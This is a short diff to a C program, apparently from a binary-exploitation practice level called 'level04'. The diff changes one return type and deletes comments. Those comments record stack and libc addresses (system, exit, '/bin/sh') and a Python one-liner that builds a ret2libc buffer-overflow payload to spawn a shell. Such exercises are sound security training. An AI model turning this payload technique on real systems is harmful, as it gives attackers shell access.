@@ -15,7 +15,7 @@ void	clear_stdin(void)
 		c = getchar();
 }
 
-int	get_unum(void)
+unsigned int	get_unum(void)
 {
 	unsigned int	value = 0;
 
@@ -78,13 +78,3 @@ int	main(void)
 	}
 	return (0);
 }
-
-// 0xffffd71c eip
-// 0xffffd680 input
-// 156 diff
-
-// 0xf7e6aed0 system
-// 0xf7e5eb70 exit
-// 0xf7f897ec /bin/sh
-
-// (python -c "print '\x90'*156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'"; cat) | ./level04
